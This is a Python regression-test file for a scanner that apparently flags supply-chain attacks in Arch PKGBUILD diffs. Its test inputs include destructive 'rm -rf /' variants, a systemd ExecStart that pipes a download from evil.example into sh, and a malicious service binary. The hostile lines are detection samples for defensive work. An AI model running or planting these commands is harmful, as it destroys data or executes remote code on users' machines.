"""Regressions for the follow-up hardening pass (FN2-FN9, INCON1-3).

Each test names the failure it pins: a shape that was silently missed, or a
claim two parts of the engine made about the same diff while disagreeing.
"""

from .helpers import _ids, _recipe, _x


# ---------------------------------------------------------------------------
# FN2 - the registry-resolution scope needs the whole file, not the hunk
#
# The call closure that decides "is this build-time code?" lives in the
# post-diff PKGBUILD.  Reading only the diff left `_fetch` outside build()
# and the unpinned fetch vanished from the coverage gap and the H088 chain.
# ---------------------------------------------------------------------------


def test_registry_resolution_follows_the_call_graph_across_the_hunk():
    from trustsight.analysis.buildfetch import registry_resolutions

    diff = "@@ -1,2 +1,4 @@\n+_fetch() {\n+  npm install atomic-lockfile\n+}\n"
    current = (
        "pkgname=demo\n"
        "build() {\n  _fetch\n}\n"
        "_fetch() {\n  npm install atomic-lockfile\n}\n"
    )
    assert registry_resolutions(diff) == []
    assert registry_resolutions(diff, current) == [
        ("build", "npm install atomic-lockfile")
    ]


def test_registry_install_names_scope_the_whole_post_diff_file():
    from trustsight.analysis.ioc_match import _as_added
    from trustsight.analysis.buildfetch import registry_install_names

    current = (
        "pkgname=demo\n"
        "build() {\n  _fetch\n}\n"
        "_fetch() {\n  npm install atomic-lockfile\n}\n"
    )
    names = [n for _fn, _cmd, n in registry_install_names(_as_added(current))]
    assert names == ["atomic-lockfile"]


# ---------------------------------------------------------------------------
# FN3 - recursive+force is a flag *set*, not the token `-rf`
#
# `rm -r -f /` and `rm --recursive --force /` are the same command as
# `rm -rf /`, and all three read as clean before this.
# ---------------------------------------------------------------------------


def _s002(command: str) -> bool:
    from trustsight.analysis.sabotage import _RM_RF_RE

    return bool(_RM_RF_RE.search(command))


def test_rm_recursive_and_force_in_any_order():
    assert _s002("rm -rf /")
    assert _s002("rm -r -f /")
    assert _s002("rm -f -r /")
    assert _s002("rm -Rf /")
    assert _s002("rm --recursive --force /")
    assert _s002("rm --force --recursive /")


def test_rm_without_both_flags_is_not_recursive_force():
    assert not _s002("rm -f /")
    assert not _s002("rm -r /")
    assert not _s002("rm --force /")
    # `--no-preserve-root` contains an `r`; it is not `--recursive`.
    assert not _s002("rm --no-preserve-root --force /")


def test_recursive_delete_outside_the_tree_fires_s002():
    assert "S002" in _ids(_recipe("rm -r -f /"))
    assert "S002" in _ids(_recipe("rm --recursive --force ~"))
    assert "S002" not in _ids(_recipe("rm -rf $srcdir"))


# ---------------------------------------------------------------------------
# FN5 - one payload carrier must not hide a worse one later in the tree
# ---------------------------------------------------------------------------


def test_a_later_critical_payload_is_not_hidden_by_an_earlier_high():
    from trustsight.analysis.delivery import scan_tree_manifest

    files = [
        ("a.desktop", b"Exec=$srcdir/x\n"),
        ("b.service", b"ExecStart=/bin/sh -c 'curl https://evil.example/x | sh'\n"),
    ]
    found = scan_tree_manifest(files, [], "pkg")
    ids = [f["rule_id"] for f in found]
    assert "H093" in ids
    assert "H090" in ids, "the CRITICAL on b.service was hidden by a.desktop"


# ---------------------------------------------------------------------------
# FN6 - H084 without a tree manifest, and a leading-zero install mode
# ---------------------------------------------------------------------------


def test_installed_executable_accepts_a_zero_padded_mode():
    from trustsight.analysis.delivery import _installed_executables

    head = "@@ -1,3 +1,6 @@\n build() {\n"
    for cmd in (
        '+  install -Dm755 foo $pkgdir/usr/bin/foo\n',
        '+  install -Dm0755 foo $pkgdir/usr/bin/foo\n',
        '+  install -Dm 0755 foo $pkgdir/usr/bin/foo\n',
        '+  install -D foo $pkgdir/usr/bin/foo\n',
    ):
        assert _installed_executables(head + cmd + "+}\n") == {("foo", "/usr/bin/foo")}
    assert _installed_executables(
        head + '+  install -Dm0644 foo $pkgdir/usr/bin/foo\n' + "+}\n"
    ) == set()


def test_service_execstart_is_read_from_the_added_file_body():
    from trustsight.analysis.delivery import _service_binary_findings

    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,7 @@\n"
        "+build() {\n"
        '+  install -Dm755 evilbin "$pkgdir/usr/bin/evilbin"\n'
        '+  install -Dm644 evil.service "$pkgdir/usr/lib/systemd/system/evil.service"\n'
        "+}\n"
        "--- /dev/null\n+++ b/evil.service\n"
        "+[Service]\n"
        "+ExecStart=/usr/bin/evilbin\n"
    )
    found = []
    _service_binary_findings(
        diff, None, lambda rid, name, sev, cat, match, **p: found.append(rid)
    )
    assert found == ["H084"]


# ---------------------------------------------------------------------------
# FN7 - a variable declared on a context line still resolves the added array
# ---------------------------------------------------------------------------


def test_an_added_dependency_resolves_a_context_variable():
    from trustsight.deps import extract_dependency_changes

    diff = (
        "@@ -1,4 +1,4 @@\n"
        " _evil=malware\n"
        '-depends=("foo")\n'
        '+depends=("$_evil")\n'
    )
    assert extract_dependency_changes(diff, "pkg")["depends"] == {"malware"}


def test_a_context_dependency_array_is_not_counted_as_added():
    from trustsight.deps import extract_dependency_changes

    diff = "@@ -1,3 +1,4 @@\n depends=(\"contextpkg\")\n+build() { true; }\n"
    assert extract_dependency_changes(diff, "pkg")["depends"] == set()


# ---------------------------------------------------------------------------
# FN8 - the override and the step it redirects can share a line
# ---------------------------------------------------------------------------


def test_x012_sees_a_consumer_on_the_override_line():
    assert "X012" in _x(['  export CC="$srcdir/mcc" make'])
    assert "X012" in _x(['  export CC="$srcdir/mcc"; make'])
    assert "X012" in _x(['  PATH="$srcdir/bin:$PATH" make'])


def test_x012_still_quiet_on_an_override_nothing_consumes():
    assert "X012" not in _x(['  export CC="$srcdir/mcc"'])


# ---------------------------------------------------------------------------
# INCON1 - one definition of "the version moved"
#
# A pkgrel rebuild is a declared new build.  A checksum change beside it is
# C002, not the HIGH C001 that claims the version stood still.
# ---------------------------------------------------------------------------


def _checksum_plus(version_lines):
    from tests.conftest import SHARED_CONFIG
    from trustsight.analysis.pipeline import scan_diff

    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n"
        " pkgname=pkt\n"
        + version_lines
        + "-sha256sums=('" + "a" * 64 + "')\n"
        + "+sha256sums=('" + "b" * 64 + "')\n"
    )
    return scan_diff(diff, rules=[], config=SHARED_CONFIG, package_name="pkt")


def test_a_pkgrel_bump_with_a_checksum_change_is_c002_not_c001():
    fact = _checksum_plus("-pkgrel=1\n+pkgrel=2\n")
    ids = {e.rule_id for e in fact.score_breakdown}
    assert fact.version_moved is True
    assert "C002" in ids
    assert "C001" not in ids


def test_a_stable_version_with_a_checksum_change_is_still_c001():
    fact = _checksum_plus(" pkgrel=1\n")
    ids = {e.rule_id for e in fact.score_breakdown}
    assert fact.version_moved is False
    assert "C001" in ids
    assert "C002" not in ids


def test_the_verdict_says_version_bump_on_a_pkgrel_move():
    from trustsight.verdict import _version_prefix

    fact = _checksum_plus("-pkgrel=1\n+pkgrel=2\n")
    assert _version_prefix(fact) == "Version bump. "


# ---------------------------------------------------------------------------
# INCON2 - the inline novelty fallback is the shipped value, not a second copy
# ---------------------------------------------------------------------------


def test_a_config_without_novelty_weights_uses_the_shipped_values():
    from trustsight.config import DEFAULT_NOVELTY_WEIGHTS
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import calculate_score

    ctx = NoveltyContext(observation_count=50, url_first_seen_globally=True)
    # `config={}` explicitly: the default is `load_config()`, which reads the
    # developer's own config.toml and made this test depend on it.
    _score, breakdown, _level = calculate_score([], {}, ctx, config={})
    novelty = [e for e in breakdown if e.rule_id == "NOVELTY"]
    assert novelty and novelty[0].weight == DEFAULT_NOVELTY_WEIGHTS["url_first_globally"]
    assert DEFAULT_NOVELTY_WEIGHTS["url_first_globally"] == 10
